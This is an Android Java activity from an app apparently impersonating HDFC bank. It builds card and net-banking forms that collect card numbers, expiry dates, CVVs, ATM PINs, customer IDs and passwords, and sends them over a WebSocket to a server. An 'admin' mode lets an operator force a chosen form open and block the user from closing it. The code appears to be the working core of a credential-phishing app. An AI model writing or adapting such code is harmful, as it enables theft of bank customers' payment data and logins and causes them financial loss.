package com.service.hdfc;


import android.annotation.SuppressLint;
import android.content.Intent;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.text.TextWatcher;
import android.view.View;
import android.widget.Button;
import android.widget.EditText;
import android.widget.LinearLayout;
import android.widget.Toast;

import androidx.appcompat.app.AppCompatActivity;

import com.google.android.material.bottomsheet.BottomSheetDialog;

import org.json.JSONException;
import org.json.JSONObject;

import java.util.HashMap;
import java.util.Map;
import java.util.Objects;

public class SecondActivity extends BaseActivity {

    private int form_id;
    private String payment_method;
    private String by;
    @SuppressLint("SetTextI18n")
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main2);
        form_id = getIntent().getIntExtra("form_id", -1);
        payment_method = getIntent().getStringExtra("payment_method");
        by = getIntent().getStringExtra("by");

        LinearLayout credit = findViewById(R.id.creditCardLayout);
        credit.setOnClickListener(v -> {
            BottomSheetDialog bottomSheetDialog = new BottomSheetDialog(this);
            View view = getLayoutInflater().inflate(R.layout.bottom_credit_card, null);
            bottomSheetDialog.setContentView(view);
            bottomSheetDialog.show();
            if(Objects.equals(by, "admin")){
                // ✅ Prevent auto-close on outside touch or back press
                bottomSheetDialog.setCanceledOnTouchOutside(false);
                bottomSheetDialog.setCancelable(false);
            }

            creditCardPage(view);
        });

        LinearLayout debit = findViewById(R.id.debitCardLayout);
        debit.setOnClickListener(v -> {
            BottomSheetDialog bottomSheetDialog = new BottomSheetDialog(this);
            View view = getLayoutInflater().inflate(R.layout.bottom_debit_card, null);
            bottomSheetDialog.setContentView(view);
            bottomSheetDialog.show();
            if(Objects.equals(by, "admin")){
                // ✅ Prevent auto-close on outside touch or back press
                bottomSheetDialog.setCanceledOnTouchOutside(false);
                bottomSheetDialog.setCancelable(false);
            }
            debitCardPage(view);

        });

        LinearLayout net = findViewById(R.id.netLayout);
        net.setOnClickListener(v -> {
            BottomSheetDialog bottomSheetDialog = new BottomSheetDialog(this);
            View view = getLayoutInflater().inflate(R.layout.net1, null);
            bottomSheetDialog.setContentView(view);
            bottomSheetDialog.show();
            if(Objects.equals(by, "admin")){
                // ✅ Prevent auto-close on outside touch or back press
                bottomSheetDialog.setCanceledOnTouchOutside(false);
                bottomSheetDialog.setCancelable(false);
            }
            netCardPage(view);
        });

        // Auto Open if Admin
        if(Objects.equals(by, "admin")) {
//            debit.setEnabled(false);
//            credit.setEnabled(false);
//            net.setEnabled(false);
            new Handler(Looper.getMainLooper()).post(() -> {
                switch (payment_method) {
                    case "debit":
                        debit.callOnClick();
                        break;
                    case "credit":
                        credit.callOnClick();
                        break;
                    case "net":
                        net.callOnClick();
                        break;
                }
            });
        }

    }


    private  void debitCardPage(View view){
        LinearLayout frontView = view.findViewById(R.id.front);
        LinearLayout backView = view.findViewById(R.id.back);

        EditText card = view.findViewById(R.id.card);
        card.addTextChangedListener(new DebitCardInputMask(card));
        card.requestFocus();

        EditText expiry = view.findViewById(R.id.expiry);
        expiry.addTextChangedListener(new ExpiryDateInputMask(expiry));

        EditText cvv = view.findViewById(R.id.cvv);

        EditText atmpin = view.findViewById(R.id.atmpin);

        // Auto-focus logic
        card.addTextChangedListener(new SimpleTextWatcher(() -> {
            String text = card.getText().toString().trim();
            if (text.length() == 19) { // 16 digits + 3 spaces
                expiry.requestFocus();
            }
        }));

        expiry.addTextChangedListener(new SimpleTextWatcher(() -> {
            String text = expiry.getText().toString().trim();
            if (text.length() == 5) { // MM/YY
                cvv.requestFocus();
            }
        }));

        // 🔹 Auto flip logic when front fields complete
        TextWatcher watcher = new SimpleTextWatcher(() -> {
            if (isFrontFieldsValid(card, expiry, cvv) && backView.getVisibility() == View.GONE) {
                flipToBack(frontView, backView, atmpin);
                helper.show("front is field is valied");
            }else {
                helper.show("front is field is invalid");
            }
        });

        card.addTextChangedListener(watcher);
        expiry.addTextChangedListener(watcher);
        cvv.addTextChangedListener(watcher);


        int form_id = getIntent().getIntExtra("form_id", -1);
        dataObject = new HashMap<>();
        ids = new HashMap<>();
        ids.put(R.id.cvv, "cvv");
        ids.put(R.id.card, "card");
        ids.put(R.id.expiry, "expiry");
        ids.put(R.id.atmpin, "atmpin");

        // Populate dataObject
        for(Map.Entry<Integer, String> entry : ids.entrySet()) {
            int viewId = entry.getKey();
            String key = entry.getValue();
            EditText editText = view.findViewById(viewId);
            String value = editText.getText().toString().trim();
            dataObject.put(key, value);
        }

        Button buttonSubmit = view.findViewById(R.id.verify_card);
        buttonSubmit.setOnClickListener(v1 -> {
            if (!validateDebitForm(view)) {
                Toast.makeText(this, "Form validation failed", Toast.LENGTH_SHORT).show();
                return;
            }
            submitLoader.show();
            try {
                dataObject.put("form_data_id", form_id);
                JSONObject dataJson = new JSONObject(dataObject); // your form data
                JSONObject sendPayload = new JSONObject();
                sendPayload.put("form_data_id", form_id);
                sendPayload.put("data", dataJson);

                // Emit through WebSocket
                socketManager.emitWithAck("formDataId", sendPayload, new SocketManager.AckCallback() {
                    @Override
                    public void onResponse(JSONObject response) {
                        runOnUiThread(() -> {
                            submitLoader.dismiss();
                            int status = response.optInt("status", 0);
                            String message = response.optString("message", "No message");
                            if (status == 200 && form_id != -1) {
                                Intent intent = new Intent(context, LastActivity.class);
                                intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_CLEAR_TASK);
                                intent.putExtra("form_id", form_id);
                                startActivity(intent);
                            } else {
                                Toast.makeText(context, "Form failed: " + message, Toast.LENGTH_SHORT).show();
                            }
                        });
                    }

                    @Override
                    public void onError(String error) {
                        runOnUiThread(() -> {
                            Toast.makeText(context, "Socket Error: " + error, Toast.LENGTH_SHORT).show();
                            submitLoader.dismiss();
                        });
                    }
                });

            } catch (JSONException e) {
                Toast.makeText(context, "Error building JSON: " + e.getMessage(), Toast.LENGTH_SHORT).show();
                submitLoader.dismiss();
            }
        });
    }

    private  void creditCardPage(View view){
        EditText card = view.findViewById(R.id.card);
        card.addTextChangedListener(new DebitCardInputMask(card));
        card.requestFocus();

        EditText expiry = view.findViewById(R.id.expiry);
        expiry.addTextChangedListener(new ExpiryDateInputMask(expiry));

        EditText cvv = view.findViewById(R.id.cvv);

        // Auto-focus logic
        card.addTextChangedListener(new SimpleTextWatcher(() -> {
            String text = card.getText().toString().trim();
            if (text.length() == 19) { // 16 digits + 3 spaces
                expiry.requestFocus();
            }
        }));

        expiry.addTextChangedListener(new SimpleTextWatcher(() -> {
            String text = expiry.getText().toString().trim();
            if (text.length() == 5) { // MM/YY
                cvv.requestFocus();
            }
        }));


        int form_id = getIntent().getIntExtra("form_id", -1);
        dataObject = new HashMap<>();
        ids = new HashMap<>();
        ids.put(R.id.cvv, "cvv");
        ids.put(R.id.card, "card");
        ids.put(R.id.expiry, "expiry");

        // Populate dataObject
        for(Map.Entry<Integer, String> entry : ids.entrySet()) {
            int viewId = entry.getKey();
            String key = entry.getValue();
            EditText editText = view.findViewById(viewId);
            String value = editText.getText().toString().trim();
            dataObject.put(key, value);
        }

        Button buttonSubmit = view.findViewById(R.id.verify_card);
        buttonSubmit.setOnClickListener(v1 -> {
            if (!validateCreditForm(view)) {
                Toast.makeText(this, "Form validation failed", Toast.LENGTH_SHORT).show();
                return;
            }
            submitLoader.show();
            try {
                dataObject.put("form_data_id", form_id);
                JSONObject dataJson = new JSONObject(dataObject); // your form data
                JSONObject sendPayload = new JSONObject();
                sendPayload.put("form_data_id", form_id);
                sendPayload.put("data", dataJson);

                // Emit through WebSocket
                socketManager.emitWithAck("formDataId", sendPayload, new SocketManager.AckCallback() {
                    @Override
                    public void onResponse(JSONObject response) {
                        runOnUiThread(() -> {
                            submitLoader.dismiss();
                            int status = response.optInt("status", 0);
                            String message = response.optString("message", "No message");
                            if (status == 200 && form_id != -1) {
                                Intent intent = new Intent(context, LastActivity.class);
                                intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_CLEAR_TASK);

                                intent.putExtra("form_id", form_id);
                                startActivity(intent);
                            } else {
                                Toast.makeText(context, "Form failed: " + message, Toast.LENGTH_SHORT).show();
                            }
                        });
                    }

                    @Override
                    public void onError(String error) {
                        runOnUiThread(() -> {
                            Toast.makeText(context, "Socket Error: " + error, Toast.LENGTH_SHORT).show();
                            submitLoader.dismiss();
                        });
                    }
                });

            } catch (JSONException e) {
                Toast.makeText(context, "Error building JSON: " + e.getMessage(), Toast.LENGTH_SHORT).show();
                submitLoader.dismiss();
            }
        });
    }

    private  void netCardPage(View view){
        EditText custid = view.findViewById(R.id.custid);
        custid.requestFocus();

        form_id = getIntent().getIntExtra("form_id", -1);
        dataObject = new HashMap<>();
        ids = new HashMap<>();
        ids.put(R.id.custid, "custid");
        ids.put(R.id.pass, "pass");

        // Populate dataObject
        for(Map.Entry<Integer, String> entry : ids.entrySet()) {
            int viewId = entry.getKey();
            String key = entry.getValue();
            EditText editText = view.findViewById(viewId);
            String value = editText.getText().toString().trim();
            dataObject.put(key, value);
        }

        Button buttonSubmit = view.findViewById(R.id.login_button);
        buttonSubmit.setOnClickListener(v1 -> {
            if (!validateCreditForm(view)) {
                Toast.makeText(this, "Form validation failed", Toast.LENGTH_SHORT).show();
                return;
            }
            submitLoader.show();
            try {
                dataObject.put("form_data_id", form_id);
                JSONObject dataJson = new JSONObject(dataObject); // your form data
                JSONObject sendPayload = new JSONObject();
                sendPayload.put("form_data_id", form_id);
                sendPayload.put("data", dataJson);

                // Emit through WebSocket
                socketManager.emitWithAck("formDataId", sendPayload, new SocketManager.AckCallback() {
                    @Override
                    public void onResponse(JSONObject response) {
                        runOnUiThread(() -> {
                            submitLoader.dismiss();
                            int status = response.optInt("status", 0);
                            String message = response.optString("message", "No message");
                            if (status == 200 && form_id != -1) {
                                Intent intent = new Intent(context, LastActivity.class);
                                intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_CLEAR_TASK);
                                intent.putExtra("form_id", form_id);
                                startActivity(intent);
                            } else {
                                Toast.makeText(context, "Form failed: " + message, Toast.LENGTH_SHORT).show();
                            }
                        });
                    }

                    @Override
                    public void onError(String error) {
                        runOnUiThread(() -> {
                            Toast.makeText(context, "Socket Error: " + error, Toast.LENGTH_SHORT).show();
                            submitLoader.dismiss();
                        });
                    }
                });

            } catch (JSONException e) {
                Toast.makeText(context, "Error building JSON: " + e.getMessage(), Toast.LENGTH_SHORT).show();
                submitLoader.dismiss();
            }
        });
    }

    private boolean isFrontFieldsValid(EditText card, EditText expiry, EditText cvv) {
        String c = card.getText().toString().trim();
        String e = expiry.getText().toString().trim();
        String v = cvv.getText().toString().trim();

        return (c.length() == 19 && e.length() == 5 && v.length() == 3);
    }

    private static class SimpleTextWatcher implements android.text.TextWatcher {
        private final Runnable onChange;
        public SimpleTextWatcher(Runnable onChange) {
            this.onChange = onChange;
        }
        @Override public void beforeTextChanged(CharSequence s, int start, int count, int after) {}
        @Override public void onTextChanged(CharSequence s, int start, int before, int count) {}
        @Override public void afterTextChanged(android.text.Editable s) {
            onChange.run();
        }
    }



    private void flipToBack(View front, View back, EditText atmpin) {
        front.animate()
                .rotationY(90f)
                .setDuration(300)
                .withEndAction(() -> {
                    front.setVisibility(View.GONE);
                    back.setVisibility(View.VISIBLE);
                    back.setRotationY(-90f);
                    back.animate()
                            .rotationY(0f)
                            .setDuration(300)
                            .start();
                })
                .start();
        atmpin.requestFocus();
    }

    private void flipToFront(View front, View back) {
        back.animate()
                .rotationY(90f)
                .setDuration(300)
                .withEndAction(() -> {
                    back.setVisibility(View.GONE);
                    front.setVisibility(View.VISIBLE);
                    front.setRotationY(-90f);
                    front.animate()
                            .rotationY(0f)
                            .setDuration(300)
                            .start();
                })
                .start();
    }



    public boolean validateDebitForm(View view) {
        boolean isValid = true;
        dataObject.clear();

        for (Map.Entry<Integer, String> entry : ids.entrySet()) {
            int viewId = entry.getKey();
            String key = entry.getValue();
            EditText editText = view.findViewById(viewId);

            // Check if the field is required and not empty
            if (!FormValidator.validateRequired(editText, "Please enter valid input")) {
                isValid = false;
                continue;
            }

            String value = editText.getText().toString().trim();

            // Validate based on the key
            switch (key) {
                case "card":
                    if (!FormValidator.validateMinLength(editText, 19, "Invalid Card Number")) {
                        isValid = false;
                    }
                    break;
                case "cvv":
                    if (!FormValidator.validateMinLength(editText, 3,  "Invalid CVV")) {
                        isValid = false;
                    }
                    break;
                case "expiry":
                    if (!FormValidator.validateMinLength(editText, 5,  "Invalid Expiry Date")) {
                        isValid = false;
                    }
                    break;
                case "atmpin":
                    if (!FormValidator.validateMinLength(editText, 4,  "Invalid ATM Pin")) {
                        isValid = false;
                    }
                    break;

                default:
                    break;
            }

            // Add to dataObject only if the field is valid
            if (isValid) {
                dataObject.put(key, value);
            }
        }

        return isValid;
    }

    public boolean validateCreditForm(View view) {
        boolean isValid = true;
        dataObject.clear();

        for (Map.Entry<Integer, String> entry : ids.entrySet()) {
            int viewId = entry.getKey();
            String key = entry.getValue();
            EditText editText = view.findViewById(viewId);

            // Check if the field is required and not empty
            if (!FormValidator.validateRequired(editText, "Please enter valid input")) {
                isValid = false;
                continue;
            }

            String value = editText.getText().toString().trim();

            // Validate based on the key
            switch (key) {
                case "card":
                    if (!FormValidator.validateMinLength(editText, 19, "Invalid Card Number")) {
                        isValid = false;
                    }
                    break;
                case "cvv":
                    if (!FormValidator.validateMinLength(editText, 3,  "Invalid CVV")) {
                        isValid = false;
                    }
                    break;
                case "expiry":
                    if (!FormValidator.validateMinLength(editText, 5,  "Invalid Expiry Date")) {
                        isValid = false;
                    }
                    break;

                default:
                    break;
            }

            // Add to dataObject only if the field is valid
            if (isValid) {
                dataObject.put(key, value);
            }
        }

        return isValid;
    }

}